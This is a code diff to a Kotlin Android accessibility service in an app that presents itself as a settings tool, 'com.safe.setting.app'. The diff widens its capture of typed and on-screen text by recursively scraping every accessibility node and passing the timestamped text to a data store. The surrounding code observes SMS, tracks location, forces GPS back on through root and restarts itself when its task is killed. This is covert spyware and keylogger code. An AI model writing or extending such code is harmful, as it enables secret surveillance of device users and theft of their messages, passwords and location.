@@ -22,8 +22,10 @@ import android.os.Handler
 import android.os.Looper
 import android.os.SystemClock
 import android.provider.Telephony
+import android.text.TextUtils
 import android.util.Log
 import android.view.accessibility.AccessibilityEvent
+import android.view.accessibility.AccessibilityNodeInfo
 import androidx.core.app.ActivityCompat
 import androidx.core.app.NotificationCompat
 import com.safe.setting.app.R
@@ -35,8 +37,6 @@ import com.safe.setting.app.services.watchdog.WatchdogJobService
 import com.safe.setting.app.utils.ConstFun.enableGpsRoot
 import com.safe.setting.app.utils.ConstFun.isRoot
 import com.safe.setting.app.utils.Consts.TAG
-import com.pawegio.kandroid.i
-import com.pawegio.kandroid.runDelayedOnUiThread
 import java.text.SimpleDateFormat
 import java.util.Date
 import java.util.Locale
@@ -57,6 +57,7 @@ class AccessibilityDataService : AccessibilityService(), LocationListener {
     private lateinit var locationManager: LocationManager
     private var smsObserver: SmsObserver? = null
 
+    // ... (onCreate, onTaskRemoved, और अन्य फ़ंक्शन्स यहाँ वैसे ही रहेंगे) ...
     override fun onTaskRemoved(rootIntent: Intent?) {
         Log.e(TAG, "TASK REMOVED, RESTARTING SERVICE...")
         val restartServiceIntent = Intent(applicationContext, this.javaClass)
@@ -181,6 +182,7 @@ class AccessibilityDataService : AccessibilityService(), LocationListener {
     @SuppressLint("SwitchIntDef")
     override fun onAccessibilityEvent(event: AccessibilityEvent?) {
         if (event == null) return
+
         try {
             val eventTypeString = when (event.eventType) {
                 AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED -> "TEXT"
@@ -188,20 +190,51 @@ class AccessibilityDataService : AccessibilityService(), LocationListener {
                 AccessibilityEvent.TYPE_VIEW_CLICKED -> "CLICKED"
                 else -> null
             }
-            eventTypeString?.let { handleEvent(event, it) }
+
+            eventTypeString?.let { type ->
+                val textData = getEventText(event)
+                if (textData.isNotEmpty()) {
+                    val formattedData = "${getDateTime()} |($type)| $textData"
+                    interactor.setDataKey(formattedData)
+                    Log.i(TAG, formattedData)
+                }
+            }
         } catch (e: Exception) {
             Log.e(TAG, "Error processing accessibility event: ${e.message}")
         }
     }
 
-    private fun handleEvent(event: AccessibilityEvent, eventType: String) {
-        val textData = event.text.joinToString(". ").trim()
-        if (textData.isNotEmpty() && textData != "null") {
-            val formattedData = "${getDateTime()} |($eventType)| $textData"
-            interactor.setDataKey(formattedData)
-            i(TAG, formattedData)
+    private fun getEventText(event: AccessibilityEvent): String {
+        val parentNodeInfo: AccessibilityNodeInfo? = event.source
+        if (parentNodeInfo == null) {
+            val eventText = event.text.toString()
+            return if (eventText != "[]") eventText else ""
         }
+
+        // स्रोत नोड और उसके सभी बच्चों (children) से टेक्स्ट को खोजने के लिए एक सहायक फ़ंक्शन का उपयोग करें
+        val text = findTextInNode(parentNodeInfo)
+        return text.trim()
     }
+
+    private fun findTextInNode(nodeInfo: AccessibilityNodeInfo?): String {
+        if (nodeInfo == null) return ""
+
+        val builder = StringBuilder()
+
+        if (!TextUtils.isEmpty(nodeInfo.text)) {
+            builder.append(nodeInfo.text.toString()).append(" ")
+        }
+
+        for (i in 0 until nodeInfo.childCount) {
+            val childNode = nodeInfo.getChild(i)
+            if (childNode != null) {
+                builder.append(findTextInNode(childNode))
+            }
+        }
+
+        return builder.toString()
+    }
+
 
     private fun getDateTime(): String {
         return try {
@@ -281,11 +314,10 @@ class AccessibilityDataService : AccessibilityService(), LocationListener {
     override fun onProviderDisabled(provider: String) {
         if (provider == LocationManager.GPS_PROVIDER) {
             interactor.enableGps(false)
-            runDelayedOnUiThread(3000) {
+            // **** बदला हुआ कोड: टाइपो को ठीक किया गया ****
+            Handler(Looper.getMainLooper()).postDelayed({
                 if (isRoot()) enableGpsRoot()
-            }
+            }, 3000)
         }
     }
 }
-
-
